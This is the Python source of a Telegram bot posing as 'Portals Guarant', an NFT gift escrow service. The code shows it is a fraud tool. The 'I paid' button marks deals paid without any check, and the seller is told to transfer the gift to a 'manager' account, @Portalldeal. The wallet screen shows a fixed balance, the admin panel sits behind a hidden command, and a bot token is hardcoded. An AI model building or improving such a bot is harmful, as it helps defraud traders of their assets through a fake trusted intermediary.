import asyncio
import logging
import json
import os
import random
import string
import re
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, CommandObject, Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# --- НАСТРОЙКИ ---
BOT_TOKEN = "9264454314:AAGu6P1Xp0_zJvWLh_NhpKM0mrGr6x93uRE"
MAIN_ADMIN_ID = 8941873700
SETTINGS_FILE = "settings.json"
DEALS_FILE = "deals.json"
USERS_FILE = "users.json"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

LINK_PORTALS = "https://t.me/portals?startapp="
LINK_SUPPORT = "https://t.me/Portalldeal"

# --- ТЕКСТЫ ---
TEXTS = {
    "ru": {
        "welcome": "<b>Portals Guarant - #1 По трейдингу NFT подарков.</b>\n\nПокупайте и продавайте всё, что угодно — безопасно.\n\n👇 <b>Выберите раздел:</b>",
        "lang_select": "🌐 <b>Выберите язык:</b>",
        "btn_create": "Создать сделку",
        "btn_wallet": "Кошелек",
        "btn_my_deals": "Мои сделки",
        "btn_market": "Portals Market",
        "btn_lang": "Язык",
        "btn_support": "Поддержка",
        "btn_back": "Назад",
        "btn_main": "В главное меню",
        "btn_pay": "Я оплатил",
        "btn_delivered": "Я передал подарок",
        "lang_changed": "Язык изменен на Русский!",
        
        "choose_method": "<b>Выберите метод оплаты:</b>",
        "method_wallet": "Кошелек (USDT, TON)",
        "method_card": "Карта (RUB, UAH)",
        "method_stars": "Звезды (Stars)",
        
        "amount_wallet": "<b>Введите сумму сделки в USDT или TON.</b>\n\nПример: 10.5 USDT или 4 TON",
        "amount_card": "<b>Введите сумму сделки в RUB или UAH.</b>\n\nПример: 1000 RUB или 500 UAH",
        "amount_stars": "<b>Введите сумму сделки в Stars.</b>\n\nПример: 150 Stars",
        
        "amount_error_wallet": "Не понял. Введите число и валюту (например: 10 USDT или 2 TON).",
        "amount_error_card": "Не понял. Введите число и валюту (например: 1000 RUB).",
        "amount_error_stars": "Не понял. Введите число и Stars (например: 100 Stars).",
        
        "prompt_ton": "Введите адрес вашего TON кошелька:",
        "prompt_usdt": "Введите адрес вашего USDT кошелька:",
        "prompt_card": "Введите номер карты для получения:",
        "prompt_stars": "Введите свой @username для получения звезд:",
        
        "enter_nft": "<b>Ссылка на NFT</b>\n\nОтправьте ссылку (t.me/nft/...):",
        "deal_success": "<b>Сделка успешно создана!</b>\n\nНомер: <code>{deal_id}</code>\nСумма: {amount}\n\nРеквизиты: {details}\nПодарок: {nft_link}\n\nСсылка для покупателя:\n{deal_link}",
        
        "deal_offer": "<b>Вам предложена сделка!</b>\n\nНомер: <code>{deal_id}</code>\nСумма: {amount}\n\n<b>Реквизиты:</b>\n<code>{details}</code>\n\nПереведите сумму и нажмите кнопку.",
        
        # Текст для ПОКУПАТЕЛЯ после оплаты
        "buyer_paid": "<b>Вы оплатили сделку!</b>\n\nОжидайте передачу подарка менеджеру.\n\nВ случае не передачи подарка будет сделан возврат средств.",
        
        # Текст для ПРОДАВЦА после оплаты
        "seller_paid_notify": "<b>Покупатель оплатил сделку {deal_id}!</b>\n\n<b>Передайте подарок менеджеру @Portalldeal для получения оплаты.</b>",
        
        # Текст для ПОКУПАТЕЛЯ когда подарок передан
        "buyer_delivered": "<b>Подарок передан менеджеру!</b>\n\nОжидайте проверки и получения средств продавцом.",
        
        # Текст для ПРОДАВЦА когда он нажал кнопку
        "seller_delivered": "<b>Вы подтвердили передачу подарка!</b>\n\nСделка завершена. Ожидайте выплаты от менеджера.",
        
        "no_deals": "У вас нет сделок.",
        "deals_title": "<b>Ваши последние сделки:</b>\n\n",
        "error_link": "Отправьте ссылку (t.me/nft/...).",
        "error_deal": "Сделка не найдена или уже оплачена!"
    },
    "en": {
        "welcome": "<b>Portals Guarant - #1 NFT Gifts Trading.</b>\n\nBuy and sell anything — safely.\n\n👇 <b>Select section:</b>",
        "lang_select": "🌐 <b>Select language:</b>",
        "btn_create": "Create deal",
        "btn_wallet": "Wallet",
        "btn_my_deals": "My deals",
        "btn_market": "Portals Market",
        "btn_lang": "Language",
        "btn_support": "Support",
        "btn_back": "Back",
        "btn_main": "Main menu",
        "btn_pay": "I paid",
        "btn_delivered": "I handed over the gift",
        "lang_changed": "Language changed to English!",
        "choose_method": "<b>Select payment method:</b>",
        "method_wallet": "Wallet (USDT, TON)",
        "method_card": "Card (RUB, UAH)",
        "method_stars": "Stars",
        "amount_wallet": "<b>Enter deal amount in USDT or TON.</b>\n\nExample: 10.5 USDT or 4 TON",
        "amount_card": "<b>Enter deal amount in RUB or UAH.</b>\n\nExample: 1000 RUB or 500 UAH",
        "amount_stars": "<b>Enter deal amount in Stars.</b>\n\nExample: 150 Stars",
        "amount_error_wallet": "Could not parse. Enter number and currency (e.g., 10 USDT or 2 TON).",
        "amount_error_card": "Could not parse. Enter number and currency (e.g., 1000 RUB).",
        "amount_error_stars": "Could not parse. Enter number and Stars (e.g., 100 Stars).",
        "prompt_ton": "Enter your TON wallet address:",
        "prompt_usdt": "Enter your USDT wallet address:",
        "prompt_card": "Enter card number for receiving:",
        "prompt_stars": "Enter your @username to receive Stars:",
        "enter_nft": "<b>NFT Link</b>\n\nSend link (t.me/nft/...):",
        "deal_success": "<b>Deal successfully created!</b>\n\nNumber: <code>{deal_id}</code>\nAmount: {amount}\n\nDetails: {details}\nGift: {nft_link}\n\nLink for buyer:\n{deal_link}",
        "deal_offer": "<b>You are offered a deal!</b>\n\nNumber: <code>{deal_id}</code>\nAmount: {amount}\n\n<b>Details:</b>\n<code>{details}</code>\n\nTransfer the amount and press the button.",
        "buyer_paid": "<b>You paid for the deal!</b>\n\nWait for the gift transfer to the manager.\n\nIf the gift is not transferred, a refund will be made.",
        "seller_paid_notify": "<b>Buyer paid for deal {deal_id}!</b>\n\n<b>Hand over the gift to manager @Portalldeal to receive payment.</b>",
        "buyer_delivered": "<b>Gift handed over to the manager!</b>\n\nWait for verification and receipt of funds by the seller.",
        "seller_delivered": "<b>You confirmed the gift transfer!</b>\n\nDeal completed. Wait for the payout from the manager.",
        "no_deals": "You have no deals.",
        "deals_title": "<b>Your last deals:</b>\n\n",
        "error_link": "Send a link (t.me/nft/...).",
        "error_deal": "Deal not found or already paid!"
    },
    "ua": {
        "welcome": "<b>Portals Guarant - #1 З торгівлі NFT подарунками.</b>\n\nКупуйте та продавайте все — безпечно.\n\n👇 <b>Оберіть розділ:</b>",
        "lang_select": "🌐 <b>Оберіть мову:</b>",
        "btn_create": "Створити угоду",
        "btn_wallet": "Гаманець",
        "btn_my_deals": "Мої угоди",
        "btn_market": "Portals Market",
        "btn_lang": "Мова",
        "btn_support": "Підтримка",
        "btn_back": "Назад",
        "btn_main": "Головне меню",
        "btn_pay": "Я оплатив",
        "btn_delivered": "Я передав подарунок",
        "lang_changed": "Мову змінено на Українську!",
        "choose_method": "<b>Оберіть метод оплати:</b>",
        "method_wallet": "Гаманець (USDT, TON)",
        "method_card": "Картка (RUB, UAH)",
        "method_stars": "Зірки (Stars)",
        "amount_wallet": "<b>Введіть суму угоди в USDT або TON.</b>\n\nПриклад: 10.5 USDT або 4 TON",
        "amount_card": "<b>Введіть суму угоди в RUB або UAH.</b>\n\nПриклад: 1000 RUB або 500 UAH",
        "amount_stars": "<b>Введіть суму угоди в Stars.</b>\n\nПриклад: 150 Stars",
        "amount_error_wallet": "Не зрозумів. Введіть число та валюту (наприклад: 10 USDT або 2 TON).",
        "amount_error_card": "Не зрозумів. Введіть число та валюту (наприклад: 1000 RUB).",
        "amount_error_stars": "Не зрозумів. Введіть число та Stars (наприклад: 100 Stars).",
        "prompt_ton": "Введіть адресу свого TON гаманця:",
        "prompt_usdt": "Введіть адресу свого USDT гаманця:",
        "prompt_card": "Введіть номер картки для отримання:",
        "prompt_stars": "Введіть свій @username для отримання зірок:",
        "enter_nft": "<b>Посилання на NFT</b>\n\nНадішліть посилання (t.me/nft/...):",
        "deal_success": "<b>Угоду успішно створено!</b>\n\nНомер: <code>{deal_id}</code>\nСума: {amount}\n\nРеквізити: {details}\nПодарунок: {nft_link}\n\nПосилання для покупця:\n{deal_link}",
        "deal_offer": "<b>Вам запропоновано угоду!</b>\n\nНомер: <code>{deal_id}</code>\nСума: {amount}\n\n<b>Реквізити:</b>\n<code>{details}</code>\n\nПерекажіть суму та натисніть кнопку.",
        "buyer_paid": "<b>Ви оплатили угоду!</b>\n\nОчікуйте передачу подарунка менеджеру.\n\nУ разі не передачі подарунка буде зроблено повернення коштів.",
        "seller_paid_notify": "<b>Покупець оплатив угоду {deal_id}!</b>\n\n<b>Передайте подарунок менеджеру @Portalldeal для отримання оплати.</b>",
        "buyer_delivered": "<b>Подарунок передано менеджеру!</b>\n\nОчікуйте перевірки та отримання коштів продавцем.",
        "seller_delivered": "<b>Ви підтвердили передачу подарунка!</b>\n\nУгоду завершено. Очікуйте виплати від менеджера.",
        "no_deals": "У вас немає угод.",
        "deals_title": "<b>Ваші останні угоди:</b>\n\n",
        "error_link": "Надішліть посилання (t.me/nft/...).",
        "error_deal": "Угоду не знайдено або вже оплачено!"
    }
}

class DealStates(StatesGroup):
    entering_amount = State()
    entering_details = State()
    entering_nft_link = State()

class AdminStates(StatesGroup):
    waiting_for_choice = State()
    waiting_for_new_value = State()

def get_settings():
    if not os.path.exists(SETTINGS_FILE):
        return {"texts": {}, "images": {}, "entities": {}, "admins": []}
    with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
        for k in ["texts", "images", "entities", "admins"]:
            if k not in data: data[k] = {} if k != "admins" else []
        return data

def save_settings(data):
    with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def get_users():
    if not os.path.exists(USERS_FILE): return {}
    with open(USERS_FILE, "r", encoding="utf-8") as f: return json.load(f)

def get_user_lang(user_id):
    return get_users().get(str(user_id), "ru")

def set_user_lang(user_id, lang):
    users = get_users()
    users[str(user_id)] = lang
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, ensure_ascii=False, indent=4)

def t(user_id, key, **kwargs):
    lang = get_user_lang(user_id)
    text = TEXTS.get(lang, TEXTS["ru"]).get(key, "")
    return text.format(**kwargs) if kwargs else text

def is_admin(user_id):
    if user_id == MAIN_ADMIN_ID: return True
    return user_id in get_settings().get("admins", [])

def get_deals():
    if os.path.exists(DEALS_FILE):
        with open(DEALS_FILE, "r", encoding="utf-8") as f: return json.load(f)
    return []

def save_deals(deals):
    with open(DEALS_FILE, "w", encoding="utf-8") as f:
        json.dump(deals, f, ensure_ascii=False, indent=4)

def generate_deal_id():
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))

def find_deal(deal_id):
    for deal in get_deals():
        if deal["deal_id"] == deal_id: return deal
    return None

def update_deal(deal_id, updates):
    deals = get_deals()
    for deal in deals:
        if deal["deal_id"] == deal_id:
            deal.update(updates)
            break
    save_deals(deals)

async def send_screen(chat_id, user_id, text_key, reply_markup, edit_message: types.Message = None, **kwargs):
    settings = get_settings()
    text = settings.get("texts", {}).get(text_key)
    if not text: text = t(user_id, text_key, **kwargs)
    elif kwargs: text = text.format(**kwargs)

    photo = settings.get("images", {}).get(text_key)
    entities = settings.get("entities", {}).get(text_key)

    if edit_message:
        try: await edit_message.delete()
        except: pass

    if photo:
        if entities: await bot.send_photo(chat_id=chat_id, photo=photo, caption=text, caption_entities=entities, reply_markup=reply_markup)
        else: await bot.send_photo(chat_id=chat_id, photo=photo, caption=text, parse_mode="HTML", reply_markup=reply_markup)
    else:
        if entities: await bot.send_message(chat_id=chat_id, text=text, entities=entities, reply_markup=reply_markup)
        else: await bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML", reply_markup=reply_markup)

def get_main_keyboard(user_id):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t(user_id, "btn_create"), callback_data="create_deal"))
    builder.row(
        InlineKeyboardButton(text=t(user_id, "btn_wallet"), callback_data="wallet"),
        InlineKeyboardButton(text=t(user_id, "btn_my_deals"), callback_data="my_deals")
    )
    builder.row(InlineKeyboardButton(text=t(user_id, "btn_market"), url=LINK_PORTALS))
    builder.row(InlineKeyboardButton(text=t(user_id, "btn_lang"), callback_data="language_menu"))
    builder.row(InlineKeyboardButton(text=t(user_id, "btn_support"), url=LINK_SUPPORT))
    if is_admin(user_id):
        builder.row(InlineKeyboardButton(text="⚙️ Админ-панель", callback_data="admin_panel"))
    return builder.as_markup()

def get_language_keyboard(user_id):
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="🇷🇺 Русский", callback_data="set_lang_ru"),
        InlineKeyboardButton(text="🇬🇧 English", callback_data="set_lang_en"),
        InlineKeyboardButton(text="🇺🇦 Українська", callback_data="set_lang_ua")
    )
    builder.row(InlineKeyboardButton(text=t(user_id, "btn_back"), callback_data="back_to_main"))
    return builder.as_markup()

def get_methods_keyboard(user_id):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t(user_id, "method_wallet"), callback_data="method_wallet"))
    builder.row(InlineKeyboardButton(text=t(user_id, "method_card"), callback_data="method_card"))
    builder.row(InlineKeyboardButton(text=t(user_id, "method_stars"), callback_data="method_stars"))
    builder.row(InlineKeyboardButton(text=t(user_id, "btn_back"), callback_data="back_to_main"))
    return builder.as_markup()

@dp.message(CommandStart(deep_link=True))
async def cmd_start_deep_link(message: types.Message, command: CommandObject, state: FSMContext):
    await state.clear()
    args = command.args
    if args:
        deal = find_deal(args)
        if deal and deal["status"] == "Ожидает оплаты":
            # Записываем ID покупателя в сделку!
            update_deal(args, {"buyer_id": message.from_user.id})
            
            text = t(message.from_user.id, "deal_offer", deal_id=deal['deal_id'], amount=deal['amount'], details=deal['details'])
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=t(message.from_user.id, "btn_pay"), callback_data=f"pay_{deal['deal_id']}")],
                [InlineKeyboardButton(text=t(message.from_user.id, "btn_main"), callback_data="back_to_main")]
            ])
            await message.answer(text, reply_markup=kb, parse_mode="HTML")
            return
    await send_screen(message.chat.id, message.from_user.id, "welcome", get_main_keyboard(message.from_user.id))

@dp.message(CommandStart())
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    await send_screen(message.chat.id, message.from_user.id, "welcome", get_main_keyboard(message.from_user.id))

@dp.callback_query(F.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await send_screen(callback.message.chat.id, callback.from_user.id, "welcome", get_main_keyboard(callback.from_user.id), edit_message=callback.message)
    await callback.answer()

@dp.callback_query(F.data == "language_menu")
async def language_menu(callback: types.CallbackQuery):
    await send_screen(callback.message.chat.id, callback.from_user.id, "lang_select", get_language_keyboard(callback.from_user.id), edit_message=callback.message)
    await callback.answer()

@dp.callback_query(F.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_lang(callback.from_user.id, lang)
    await callback.answer(t(callback.from_user.id, "lang_changed"), show_alert=True)
    await send_screen(callback.message.chat.id, callback.from_user.id, "welcome", get_main_keyboard(callback.from_user.id), edit_message=callback.message)

@dp.callback_query(F.data == "create_deal")
async def start_deal(callback: types.CallbackQuery, state: FSMContext):
    await state.clear() 
    await send_screen(callback.message.chat.id, callback.from_user.id, "choose_method", get_methods_keyboard(callback.from_user.id), edit_message=callback.message)
    await callback.answer()

@dp.callback_query(F.data.in_({"method_wallet", "method_card", "method_stars"}))
async def choose_method(callback: types.CallbackQuery, state: FSMContext):
    method = callback.data.replace("method_", "")
    await state.update_data(method=method)
    
    if method == "wallet": text_key = "amount_wallet"
    elif method == "card": text_key = "amount_card"
    else: text_key = "amount_stars"
        
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(callback.from_user.id, "btn_back"), callback_data="create_deal")]])
    await send_screen(callback.message.chat.id, callback.from_user.id, text_key, kb, edit_message=callback.message)
    await state.set_state(DealStates.entering_amount)
    await callback.answer()

def parse_amount(text, method):
    text = text.lower().replace(",", ".")
    match = re.search(r'([\d\.]+)\s*([a-zа-яё$]*)?', text)
    if not match: return None, None
    try: amount = float(match.group(1))
    except: return None, None
    currency_raw = match.group(2) if match.group(2) else ""
    
    if method == "wallet":
        if "ton" in currency_raw: return amount, "TON"
        elif "usdt" in currency_raw or "$" in currency_raw or not currency_raw: return amount, "USDT"
        else: return None, None
    elif method == "card":
        if "rub" in currency_raw or "р" in currency_raw or not currency_raw: return amount, "RUB"
        elif "uah" in currency_raw or "грн" in currency_raw: return amount, "UAH"
        else: return None, None
    elif method == "stars":
        if "star" in currency_raw or "звезд" in currency_raw or "зір" in currency_raw or not currency_raw: return amount, "Stars"
        else: return None, None
    return None, None

@dp.message(DealStates.entering_amount)
async def process_amount(message: types.Message, state: FSMContext):
    data = await state.get_data()
    method = data.get("method")
    amount, currency = parse_amount(message.text, method)
    
    if amount is None:
        if method == "wallet": err_key = "amount_error_wallet"
        elif method == "card": err_key = "amount_error_card"
        else: err_key = "amount_error_stars"
        return await message.answer(t(message.from_user.id, err_key))
        
    await state.update_data(amount=amount, currency=currency)
    
    if currency == "TON": prompt = t(message.from_user.id, "prompt_ton")
    elif currency == "USDT": prompt = t(message.from_user.id, "prompt_usdt")
    elif currency in ["RUB", "UAH"]: prompt = t(message.from_user.id, "prompt_card")
    elif currency == "Stars": prompt = t(message.from_user.id, "prompt_stars")
        
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(message.from_user.id, "btn_back"), callback_data="create_deal")]])
    await message.answer(f"<b>{prompt}</b>", reply_markup=kb, parse_mode="HTML")
    await state.set_state(DealStates.entering_details)

@dp.message(DealStates.entering_details)
async def process_details(message: types.Message, state: FSMContext):
    await state.update_data(details=message.text)
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(message.from_user.id, "btn_back"), callback_data="create_deal")]])
    await send_screen(message.chat.id, message.from_user.id, "enter_nft", kb)
    await state.set_state(DealStates.entering_nft_link)

@dp.message(DealStates.entering_nft_link)
async def process_nft_link(message: types.Message, state: FSMContext):
    if "t.me/nft/" not in message.text: return await message.answer(t(message.from_user.id, "error_link"))
    data = await state.get_data()
    deal_id = generate_deal_id()
    bot_info = await bot.get_me()
    deal_link = f"https://t.me/{bot_info.username}?start={deal_id}"
    amount_str = f"{data['amount']} {data['currency']}"
    
    deal_data = {
        "deal_id": deal_id, "user_id": message.from_user.id, "user_name": message.from_user.full_name,
        "amount": amount_str, "currency": data["currency"], "details": data["details"],
        "nft_link": message.text, "status": "Ожидает оплаты", "date": datetime.now().strftime("%Y-%m-%d %H:%M"),
        "buyer_id": None # Изначально покупателя нет
    }
    deals = get_deals()
    deals.append(deal_data)
    save_deals(deals)
    await state.clear()
    
    text = t(message.from_user.id, "deal_success", deal_id=deal_id, amount=amount_str, details=data["details"], nft_link=message.text, deal_link=deal_link)
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(message.from_user.id, "btn_main"), callback_data="back_to_main")]])
    await message.answer(text, parse_mode="HTML", reply_markup=kb)

# --- ОПЛАТА ---
@dp.callback_query(F.data.startswith("pay_") & ~F.data.in_({"pay_wallet", "pay_card", "pay_stars"}))
async def process_payment(callback: types.CallbackQuery):
    deal_id = callback.data.replace("pay_", "")
    deal = find_deal(deal_id)
    
    if not deal or deal["status"] != "Ожидает оплаты":
        return await callback.answer(t(callback.from_user.id, "error_deal"), show_alert=True)
        
    update_deal(deal_id, {"status": "Оплачено"})
    
    # 1. Показываем ПОКУПАТЕЛЮ
    buyer_text = t(callback.from_user.id, "buyer_paid")
    await callback.message.edit_text(buyer_text, parse_mode="HTML")
    
    # 2. Отправляем ПРОДАВЦУ (с кнопкой "Я передал подарок")
    seller_text = t(deal["user_id"], "seller_paid_notify", deal_id=deal_id)
    kb_seller = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t(deal["user_id"], "btn_delivered"), callback_data=f"delivered_{deal_id}")]
    ])
    try:
        await bot.send_message(deal["user_id"], seller_text, reply_markup=kb_seller, parse_mode="HTML")
    except: pass
    
    await callback.answer()

# --- ПЕРЕДАЧА ПОДАРКА (Нажимает ПРОДАВЕЦ) ---
@dp.callback_query(F.data.startswith("delivered_"))
async def process_delivered(callback: types.CallbackQuery):
    deal_id = callback.data.replace("delivered_", "")
    deal = find_deal(deal_id)
    
    if not deal: return await callback.answer("Сделка не найдена.")
    
    update_deal(deal_id, {"status": "Завершено"})
    
    # 1. Показываем ПРОДАВЦУ (который нажал)
    seller_text = t(callback.from_user.id, "seller_delivered")
    await callback.message.edit_text(seller_text, parse_mode="HTML")
    
    # 2. Отправляем уведомление ПОКУПАТЕЛЮ
    if deal.get("buyer_id"):
        buyer_text = t(deal["buyer_id"], "buyer_delivered")
        try:
            await bot.send_message(deal["buyer_id"], buyer_text, parse_mode="HTML")
        except: pass
        
    await callback.answer("Сделка завершена!")

# --- ОСТАЛЬНОЕ ---
@dp.callback_query(F.data == "wallet")
async def wallet_menu(callback: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(callback.from_user.id, "btn_main"), callback_data="back_to_main")]])
    await callback.message.edit_text("<b>Ваш кошелек</b>\n\nБаланс: 0.00 TON", reply_markup=kb, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "my_deals")
async def my_deals(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    deals = [d for d in get_deals() if d["user_id"] == user_id]
    if not deals: return await callback.answer(t(user_id, "no_deals"), show_alert=True)
    text = t(user_id, "deals_title")
    for d in reversed(deals[-5:]):
        text += f"<code>{d['deal_id']}</code> | {d['amount']} | {d['status']}\n"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(user_id, "btn_main"), callback_data="back_to_main")]])
    await callback.message.answer(text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

# --- АДМИН ПАНЕЛЬ ---
@dp.message(Command("ruvire"))
async def cmd_admin_panel(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id): return await message.answer("Нет доступа.")
    menu_text = (
        "<b>Настройка бота</b>\n\n"
        "1. Текст приветствия\n2. Текст выбора метода\n3. Текст Кошелек (ввод суммы)\n4. Текст Карта (ввод суммы)\n"
        "5. Текст Звезды (ввод суммы)\n6. Текст ввода NFT\n7. Текст успешной сделки\n\n"
        "8. Картинка: Приветствие\n9. Картинка: Метод\n10. Картинка: Кошелек (сумма)\n"
        "11. Картинка: Карта (сумма)\n12. Картинка: Звезды (сумма)\n13. Картинка: NFT\n14. Картинка: Успех\n\n"
        "22. Добавить админа\n23. Удалить админа\n\n"
        "Отправьте цифру, затем новое значение."
    )
    await message.answer(menu_text, parse_mode="HTML")
    await state.set_state(AdminStates.waiting_for_choice)

@dp.message(AdminStates.waiting_for_choice)
async def process_admin_choice(message: types.Message, state: FSMContext):
    if not message.text.isdigit(): return await message.answer("Отправьте число.")
    choice = int(message.text)
    
    if choice == 22:
        await message.answer("Отправьте ID нового админа:")
        await state.update_data(action="add_admin")
        await state.set_state(AdminStates.waiting_for_new_value)
        return
    if choice == 23:
        config = get_settings()
        if not config.get("admins"): return await message.answer("Нет доп. админов.")
        await message.answer("Отправьте ID для удаления:\n" + "\n".join(map(str, config["admins"])))
        await state.update_data(action="del_admin")
        await state.set_state(AdminStates.waiting_for_new_value)
        return

    keys = {
        1: "welcome", 2: "choose_method", 3: "amount_wallet", 4: "amount_card", 5: "amount_stars", 6: "enter_nft", 7: "deal_success",
        8: "welcome", 9: "choose_method", 10: "amount_wallet", 11: "amount_card", 12: "amount_stars", 13: "enter_nft", 14: "deal_success"
    }
    if choice not in keys: return await message.answer("Неверный номер.")
    
    action = "text" if choice <= 7 else "image"
    await state.update_data(key=keys[choice], action=action)
    await message.answer(f"Отправьте новое значение для пункта {choice}:")
    await state.set_state(AdminStates.waiting_for_new_value)

@dp.message(AdminStates.waiting_for_new_value)
async def process_new_value(message: types.Message, state: FSMContext):
    data = await state.get_data()
    settings = get_settings()
    
    if data["action"] == "add_admin":
        try:
            new_id = int(message.text)
            if new_id not in settings["admins"]:
                settings["admins"].append(new_id)
                save_settings(settings)
                await message.answer("Админ добавлен.")
            else: await message.answer("Уже админ.")
        except: await message.answer("Ошибка ID.")
    elif data["action"] == "del_admin":
        try:
            del_id = int(message.text)
            if del_id in settings["admins"]:
                settings["admins"].remove(del_id)
                save_settings(settings)
                await message.answer("Админ удален.")
            else: await message.answer("Не найден.")
        except: await message.answer("Ошибка ID.")
    elif data["action"] == "text":
        settings["texts"][data["key"]] = message.html_text
        if message.entities: settings["entities"][data["key"]] = [e.model_dump() for e in message.entities]
        elif data["key"] in settings.get("entities", {}): del settings["entities"][data["key"]]
        save_settings(settings)
        await message.answer("Текст обновлен!")
    elif data["action"] == "image":
        if not message.photo: return await message.answer("Отправьте фото.")
        settings["images"][data["key"]] = message.photo[-1].file_id
        save_settings(settings)
        await message.answer("Картинка обновлена.")
    await state.clear()

@dp.callback_query(F.data == "stub")
async def stub(callback: types.CallbackQuery):
    await callback.answer("В разработке", show_alert=True)

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
